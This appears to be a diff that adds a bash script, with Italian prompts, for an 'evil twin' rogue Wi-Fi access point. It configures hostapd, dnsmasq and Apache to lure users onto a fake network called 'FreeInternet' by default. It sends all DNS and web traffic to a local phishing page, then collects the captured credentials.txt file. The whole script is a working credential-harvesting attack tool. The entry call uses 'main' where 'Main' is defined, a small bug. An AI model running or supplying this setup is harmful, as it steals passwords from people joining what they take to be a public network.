@@ -1,0 +1,125 @@
+#!/bin/bash
+
+dir=$(pwd)
+
+InstDip () {
+	if [[ $EUID -ne 0 ]]; then
+		echo "This script must be run as root" 
+		exit 1
+	fi
+
+
+	if ! which php > /dev/null; then
+		echo "PHP not found!"
+		echo "Installo php..."
+		apt-get install -y php
+	fi
+
+	if ! which hostapd > /dev/null; then
+		echo "hostapd not found!"
+		echo "installo hostapd"
+		apt-get install -y hostapd	
+	fi
+
+	if ! which dnsmasq > /dev/null; then
+		echo "dnsmasq not found!"
+		echo "installo dnsmasq"
+		apt-get install -y dnsmasq
+	fi
+
+	if ! which apache2 > /dev/null; then
+		echo "apache2 not found!"
+        echo "installo apache2"
+        apt-get install -y apache2
+	fi
+}
+
+SetIpTables(){
+	iptables -F
+	iptables -t nat -F
+	echo 1 > /proc/sys/net/ipv4/ip_forward
+}
+
+Backup(){
+	rm -r /tmp/apache2 -f
+	rm -r /tmp/www -f
+	cp -r /var/www /tmp/
+	cp -r /etc/apache2 /tmp/
+	rm -r /etc/apache2 -f
+	rm -r /var/www -f
+}
+
+StartConf (){
+	cp -r $dir/apache2 /etc/
+	cp -r $dir/www /var/
+	chown -R www-data:www-data /var/www
+	killall dnsmasq 2> /dev/null
+	systemctl stop apache2
+	airmon-ng check kill > /dev/null
+	a2enmod rewrite 2> /dev/null
+	systemctl apache2 reload 2> /dev/null
+	echo ""
+	iwconfig 2>&1 | grep 802.11
+	echo "" 
+	source /etc/apache2/envvars 2> /dev/null
+	read -p "Inserisci l'interfaccia di rete (wlan0): " wifi
+	read -p "Inserisci il nome del ROGUEAP (FreeInternet): " ssid
+	read -p "inserisci il canale di preferenza (1,6,11): " cha
+	echo ""
+	iptables -A FORWARD -i $wifi -p tcp --dport 53 -j ACCEPT 
+	iptables -A FORWARD -i $wifi -p udp --dport 53 -j ACCEPT
+	iptables -A FORWARD -i $wifi -p tcp --dport 80 -d 10.0.0.1 -j ACCEPT
+	iptables -A FORWARD -i $wifi -j DROP
+	#Inizializzo hostapd.conf
+	rm hostapd.conf -f
+	echo interface=$wifi >> hostapd.conf
+	echo ssid=$ssid >> hostapd.conf
+	echo channel=$cha >> hostapd.conf 
+	echo hw_mode=g >> hostapd.conf
+	#Inizializzo dnsmasq.conf
+	rm dnsmasq.conf -f
+	echo dhcp-range=10.0.0.2,10.0.0.100,255.255.255.0,12h >> dnsmasq.conf
+	echo address=/#/10.0.0.1 >> dnsmasq.conf
+	echo no-resolv >> dnsmasq.conf
+	echo log-queries >> dnsmasq.conf
+	ifconfig $wifi 10.0.0.1
+	dnsmasq -C dnsmasq.conf 2> /dev/null
+	hostapd hostapd.conf -B
+	echo ""
+	systemctl start apache2
+	iptables -t nat -A PREROUTING -i $wifi -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80
+	read -p 'Premere INVIO per uscire'
+	killall hostapd
+	killall dnsmasq
+	killall apache2
+	rm hostapd.conf -f
+	rm dnsmasq.conf -f
+	cp /var/www/html/credentials.txt $dir/ 2> /dev/null
+}
+
+RestoreOldConf(){
+	rm -r /etc/apache2 -f
+	rm -r /var/www -f
+	cp -r /tmp/apache2 /etc/
+	cp -r /tmp/www /var/
+	chown -R www-data:www-data /var/www
+	iptables -F
+	iptables -t nat -F
+	echo 0 > /proc/sys/net/ipv4/ip_forward
+	/etc/init.d/network-manager restart > /dev/null
+	echo Chiusura avvenuta con successo.
+	echo ""
+	unset dir
+}
+
+Main() {
+	InstDip
+	SetIpTables
+	Backup
+	StartConf
+	RestoreOldConf
+}
+
+if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
+    main "$@"
+fi
